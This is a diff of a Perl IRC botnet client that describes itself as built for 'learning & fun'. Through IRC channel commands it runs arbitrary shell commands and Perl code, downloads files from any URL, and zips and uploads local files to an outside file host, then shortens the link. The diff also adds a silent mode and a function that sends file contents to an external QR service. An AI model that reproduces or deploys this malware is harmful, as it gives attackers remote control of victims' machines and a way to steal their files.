@@ -1,23 +1,30 @@
 #!/usr/bin/perl -w
-#Purpose: a learning-pupose botnet
-#Github: github.com/hcac/zmb2
+#Purpose no.1: learning & fun
+#
+#Github: https://github.com/hcac/zmb2
 #For documentation see "HELP.txt" on Github
-#Written by hcac
+#
+#This is an IRC bot script in Perl
+#
+#Evilzone <3
+#written by hcac
 
-use strict;
+use strict; #as always
 use warnings;
-use threads;
-use Net::Ping;
+use threads; #multitasking
+use Switch; #less IFs
+use Net::Ping; #for connectivity checks
 use IO::Socket::INET; #for connecting to IRC server
-use LWP::Simple qw (getstore);
-use LWP::UserAgent;
-use HTTP::Request::Common qw (POST);
-use Archive::Zip;
-use Cwd;
+use LWP::Simple qw (getstore); #for downloading
+use LWP::UserAgent; #uploading files and generating QR codes online
+use HTTP::Request::Common qw (POST); #^
+use Archive::Zip; #zipping files before uploading
+use Cwd; #changing/knowing current working directory
 
-$| = 1;
+$| = 1; #hot IO
 
-#Change these
+#general configuration
+my $silent = 0; #change it to 1 for on
 my $server = '127.0.0.1';
 my $port = 6667;
 my $channel = '#lab';
@@ -25,17 +32,24 @@ my $nick_prefix = "test";
 my $user = "ISOMER 8 * :sum it up";
 #END
 
-my ($socket, $thr_keep_connection);
+if ($silent == 1) {
+	close(STDOUT);
+	close(STDERR);
+}
+
+my ($socket, $thr_keep_connection, $reply_to); #outer, for every sub to see
 
 main();
 
-sub main { #I hate doing it this way, but didn't have any other idea
+sub main { #the whole as a subrouting to make it reconnecetable
 
 	#Internal Variables
 	my $bot = 0; #this tells the bot to or not to apply commands
 	
 	my $thr_connect = threads->create(\&func_connect); 
 	#$thr_connect a thread for making our socket
+	#this is the first time I do this, so it probably has,
+	#some issues with pointers, so use with caution
 	
 	$socket = $thr_connect->join; #get the made socket
 	
@@ -62,7 +76,7 @@ sub main { #I hate doing it this way, but didn't have any other idea
 		my ($from) = $full_from =~ /:(.+)!/;
 		#the nick of sender
 		
-		my $reply_to = ($to eq $channel) ? $to : $from;
+		$reply_to = ($to eq $channel) ? $to : $from;
 		#the results of commands 'll be sent to $reply_to
 		
 		$msg =~ s/://;
@@ -76,100 +90,53 @@ sub main { #I hate doing it this way, but didn't have any other idea
 		next if ($bot == 0); #don't apply any commands if bot was off
 		
 		#------THE START OF APPLYING COMMANDS
-		if ($msg =~ /^!CMD/i) {
-			my @cmd_args = split(/\s/, $msg, 2);
+		
+		switch ($msg) {
+			case /^!CMD/i { command_center(\&func_cmd, $msg, 2) }
+			case /^!PERL/i { command_center(\&func_perl, $msg, 2) }
+			case /^!IRC/i { $msg =~ s/^!IRC\s//i; print $socket "$msg\n"; }
+			case /^!UP/i { command_center(\&func_up_and_shorten, $msg, 2) }
+			case /^!GET/i { command_center(\&func_get, $msg, 3) }
+			case /^!QR/i { command_center(\&genQR, $msg, 2) }
+			case /^!EXIT/i { exit }
+		}
+		
+		sub command_center { #this is where commands are mostly interpreted
+			#return -1 if (!$_[0] || $![1]);
+			my ($func_p, $msg, $count) = (shift @_, shift @_, shift @_);
 			
-			chomp(my $cmd_command = $cmd_args[1]);
-			$cmd_command =~ s/\r$//;
+			my @cmd_args = split(/\s/, $msg, $count);
+			#extracts the parameters of the command sent to bot
 			
-			my $thr_cmd = threads->create(\&func_cmd, $cmd_command);
+			$_ =~ s/(\r|\n)(\r|\n)$// foreach (@cmd_args);
 			
-			my $thr_cmd_result = $thr_cmd->join;
-			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "no ret";
+			my @params;
+			push(@params, $cmd_args[$_]) foreach (1 .. $count - 1);
+			
+			my $thr_cmd = threads->create($func_p, @params);
+			#using "threads" to avoid some crashes
+			
+			my $thr_cmd_result = $thr_cmd->join; #get the results
+			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "Done";
+			#results can be null like "rm -rf *" so we want to know if done
 			
 			my $bot_msg = "PRIVMSG $reply_to :$cmd_result";
 			$bot_msg = substr($bot_msg, 0,508);
+			#to always ensure that it's not more than IRC limits
 			print $socket $bot_msg . "\n";
-		}
-		
-		if ($msg =~ /^!PERL/i) {
-			my @cmd_args = split(/\s/, $msg, 2);
-			
-			chomp(my $perl_code = $cmd_args[1]);
-			$perl_code =~ s/\r$//;
-			
-			my $thr_cmd = threads->create(\&func_perl, $perl_code);
-			
-			my $thr_cmd_result = $thr_cmd->join;
-			my $cmd_result = ($thr_cmd_result) ? $thr_cmd_result : "no ret";
-			
-			my $bot_msg = "PRIVMSG $reply_to :$cmd_result";
-			$bot_msg = substr($bot_msg, 0,508);
-			print $socket $bot_msg . "\n";
-		}
-		
-		if ($msg =~ /^!IRC/i) {
-			my @cmd_args = split(/\s/, $msg, 2);
-			
-			chomp(my $irc_command = $cmd_args[1]);
-			$irc_command =~ s/\r$//;
-			
-			my $bot_msg = substr($irc_command, 0,508);
-			print $socket $bot_msg . "\n";
-		}
-		
-		if ($msg =~ /^!UP\s.+/i) {
-			my @cmd_args = split(/\s/, $msg, 2);
-			
-			chomp(my $up_file = $cmd_args[1]);
-			$up_file =~ s/\r$//;
-			
-			my $thr_cmd = threads->create(\&func_up_and_shorten, $up_file);
-			
-			my $thr_cmd_result = $thr_cmd->join;
-			my $up_result = ($thr_cmd_result =~ /^-1/) ? "Failed" : $thr_cmd_result;
-			
-			my $bot_msg = "PRIVMSG $reply_to :$up_result";
-			$bot_msg = substr($bot_msg, 0,508);
-			print $socket $bot_msg . "\n";
-		}
-		
-		if ($msg =~ /^!GET\s.+\s.+/i) {
-			my @cmd_args = split(/\s/, $msg, 3);
-			
-			chomp(my $url = $cmd_args[1]);
-			chomp(my $save = $cmd_args[2]);
-			$url =~ s/\r$//;
-			$save =~ s/\r$//;
-			
-			my $thr_cmd = threads->create(\&func_get, $url, $save);
-			
-			my $thr_cmd_result = $thr_cmd->join;
-			my $get_result = ($thr_cmd_result =~ /-1/) ? "Failed" : 'Done';
-			
-			my $bot_msg = "PRIVMSG $reply_to $get_result";
-			print $socket $bot_msg . "\n";
-		}
-		
-		if ($msg =~ /^!EXIT/i) {
-			print $socket "QUIT\n";
-			undef $socket;
-			
-			$thr_keep_connection->detach;
-			
-			exit 0;
-		}
+}
 		#------THE END OF APPLYING COMMANDS
 	}
 	
 	$thr_keep_connection->join;
 }
 
-main(); #programmer doesn't really want this to end!!
+main(); #Don't really want this to finish!
 
-#Internal Functions
+#internal functions
+#used by the "applying commands" section
 
-sub func_connect {
+sub func_connect { #tries to connect 'till success
 	while (!defined ($socket = IO::Socket::INET->new (
 			PeerAddr => $server,
 			PeerPort => $port,
@@ -178,14 +145,14 @@ sub func_connect {
 		sleep 10;
 	}
 	
-	if ($socket) {
+	if ($socket) { #tell the IRC server who you are
 	
-	print $socket "USER $user\n";
-	my $randnum = int rand 9999;
-	print $socket "NICK $nick_prefix$randnum\n"; #always a new nick
-	print $socket "JOIN $channel\n";
+		print $socket "USER $user\n";
+		my $randnum = int rand 9999;
+		print $socket "NICK $nick_prefix$randnum\n"; #always a new nick
+		print $socket "JOIN $channel\n";
 	
-	return $socket;
+		return $socket;
 	}
 }
 
@@ -199,17 +166,20 @@ sub func_keep_connection {
 	}
 }
 
-sub func_cmd {
+sub func_cmd { #just runs the command with backticks and returns the results
+	return -1 if (!$_[0]);
 	my $command = $_[0];
 	return `$command`;
 }
 
-sub func_perl {
+sub func_perl { #eval() and returns the returned value
+	return -1 if (!$_[0]);
 	my $command = $_[0];
 	return eval($command);
 }
 
-sub func_up_and_shorten {
+sub func_up_and_shorten { #to mix the both functions
+	return -1 if (!$_[0]);
 	my $file = $_[0];
 	
 	my $long_url = upload($file);
@@ -219,12 +189,39 @@ sub func_up_and_shorten {
 	return -1;
 }
 
-sub func_get {
+sub func_get { #downloading a file with getstore()
 	return -1 if (!$_[0] || !$_[1]);
 	
 	getstore($_[0], $_[1]) || return -1;
+	#return -1 if couldn't download from the URL
 	
 	return 0;
+}
+
+sub genQR {
+	return -1 if (!$_[0]);
+	
+	my $toqr = "";
+	my $randnum = int(rand(9999));
+	my $saved_img = $randnum . '.png';
+	my $qr_gen_url = 'https://api.qrserver.com/v1/create-qr-code/?data=';
+	print $_[0];
+	if (-r $_[0]) { #if the given thing is a readable file's name
+		my $data = "";
+		
+		open(FH, $_[0]);
+		$data .= $_ while (<FH>);
+		close(FH);
+		
+		$toqr = substr($data, 0, 300); #ensure to obey the QR limits
+	}
+	else { #if not, just qr the text
+		$toqr = substr($_[0], 0, 300);
+	}
+	
+	getstore($qr_gen_url . $toqr, $saved_img);
+	
+	return cwd . '/' . $saved_img; #returning the full path of img
 }
 
 sub upload {
@@ -234,26 +231,30 @@ sub upload {
 	
 	my ($to_upload, $zipped);
 	
-	if ($file !~ /\.(zip|txt)$/) { #unfilter exts mostly allowed
+	if ($file !~ /\.(zip|txt)$/) { #unfilter txt and zip exts
+		#zip should not be re-zipped! so...
+		
 		#make the file ready
 		my $zip = new Archive::Zip;
 		$zip->addFile($file);
 		
-		my $randnum = int(rand 99999);
-		$to_upload = $randnum . '.zip';
+		my $randnum = int(rand 99999); #always a random filename
+		$to_upload = $randnum . '.zip'; #tells to upload the zipped file
 		
-		$zip->writeToFileNamed($randnum . '.zip');
+		$zip->writeToFileNamed($randnum . '.zip'); #compression starts
 		
-		$zipped = 1;
+		$zipped = 1; #to know that WE zipped the file
+		#becomes handy when auto-removing the auto-zipped file
 	}
 	else {
-		$to_upload = $file;
+		$to_upload = $file; #if it's a txt, then just upload it
 	}
 	
-	#uploading process
+	#uploading process starts
 	my $req = POST 'http://s000.tinyupload.com/cgi-bin/upload.cgi',
 			Content_Type => 'multipart/form-data',
 			Content => [uploaded_file => [$to_upload]];
+	#initializing our post request
 	
 	$req->header('Content-Type' => 'multipart/form-data');
 	$req->header(Referer => '');
@@ -268,19 +269,22 @@ sub upload {
 	unlink($to_upload) if ($zipped);
 	
 	my ($code) = $content =~ /file_id=(\d+)/;
+	#the only thing we need to generate the link
 	
 	return ($code) ? 'http://s000.tinyupload.com/?file_id=' . $code : -1;
+	#returns the link if a code was generated by the website
 }
 
-sub shorten {
+sub shorten { #simple URL shortner :D
 	return -1 if (!$_[0]);
 	
 	my $url = $_[0];
 	
 	my $req = new HTTP::Request(POST => 'http://leggy.io/api/v1/shorten');
+	#post request is now ready
 	
-	$req->header('Content-Type' => 'application/json');
-	$req->content('{"longUrl":"' . $url . '"}');
+	$req->header('Content-Type' => 'application/json'); #needed headers
+	$req->content('{"longUrl":"' . $url . '"}'); #API content
 	
 	my $ua = new LWP::UserAgent;
 	
@@ -288,4 +292,5 @@ sub shorten {
 	my @param = split('"', $result);
 	
 	return ($param[7]) ? $param[7] : -1;
+	#tell if failed or just give back the link
 }
